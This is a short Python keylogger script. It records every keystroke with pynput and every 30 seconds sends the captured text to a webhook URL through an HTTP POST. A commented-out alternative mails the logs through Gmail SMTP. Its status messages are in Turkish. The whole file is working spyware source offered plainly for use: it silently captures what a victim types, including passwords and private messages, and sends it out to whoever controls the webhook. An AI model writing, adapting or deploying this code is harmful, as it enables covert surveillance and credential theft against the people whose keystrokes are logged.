import pynput.keyboard
import smtplib
import threading
import requests
import json

webhook_url = "url"

thw_word = ""

def callback_function(key):
    global thw_word
    try:
        #log = log + key.char.encode('utf-8')
        thw_word = thw_word + str(key.char)
    except AttributeError:
        if key == key.space:
            thw_word = thw_word + " "
        else:
            thw_word = thw_word + str(key)
    except:
        pass


"""
def send_email(email,password,message):
    email_server = smtplib.SMTP("smtp.gmail.com",587)
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,email,message)
    email_server.quit()

#thread - threading
"""


def send_webhook_message(log):
    headers = {"Content-Type": "application/json"}
    payload = {"content": log}
    response = requests.post(webhook_url, headers=headers, data=json.dumps(payload))

    if response.status_code == 204:
        print("Mesaj başarıyla gönderildi.")
    else:
        print("Mesaj gönderimi sırasında bir hata oluştu. Hata kodu: " + str(response.status_code))

def thread_function():
    global thw_word
    #send_email("user@gmail.com", "password", log.encode('utf-8'))
    send_webhook_message(thw_word)
    thw_word = ""
    timer_object = threading.Timer(30,thread_function)
    timer_object.start()


keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
with keylogger_listener:
    thread_function()
    keylogger_listener.join()

